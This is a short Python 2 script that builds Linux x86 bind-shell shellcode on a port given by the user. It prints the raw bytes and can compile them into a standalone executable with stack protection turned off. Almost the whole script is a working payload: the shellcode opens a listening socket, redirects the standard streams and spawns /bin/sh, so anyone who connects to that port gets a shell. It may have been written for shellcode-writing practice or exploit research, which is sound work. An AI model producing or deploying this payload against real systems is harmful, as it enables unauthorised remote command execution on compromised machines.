#!/usr/bin/python

#####	Generate bind shellcode

import sys
import struct

if len(sys.argv) < 2 or int(sys.argv[1]) not in range(1,65536):
	sys.exit("Usage: bind.py [1-65535] [compiled.elf]")

port = struct.pack(">H", int(sys.argv[1]))

shellcode = (
	"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb3\x01"
	"\xb0\x66\xcd\x80\x89\xc6\x31\xc0\xb0\x01\x50\x89\xe1\x51"
	"\x40\x50\x48\x50\x56\x89\xe1\xb3\x0e\xb0\x66\xcd\x80\x31"
	"\xc0\x50\x66\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
	"\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x66\x68\x02\x10\x56"
	"\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89"
	"\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x31\xc9\xb1\x02\x89"
	"\xfb\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2"
	"\x53\x89\xe1\xb0\x0b\xcd\x80\xe9\x76\xff\xff\xff"
	)

print
print "Shellcode Length: %d" % len(bytearray(shellcode))
print
sc = ""
for c in bytearray(shellcode):
	sc += "\\x%02x" % c
print sc


#####	Generate an executable 		


if len(sys.argv) < 3: sys.exit()

import os

skeleton = '''
#include<stdio.h>
#include<string.h>
unsigned char code[] = "__SHELLCODE__";
void main()
{
	printf("Shellcode Length: %d\\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
'''

skeleton = skeleton.replace("__SHELLCODE__", sc)

with open("a.c", "w") as f:
	f.write(skeleton)

os.system("gcc a.c -fno-stack-protector -z execstack")
os.rename("a.out", sys.argv[2])
os.remove("a.c")

print
print "Executable: %s" % sys.argv[2]
print
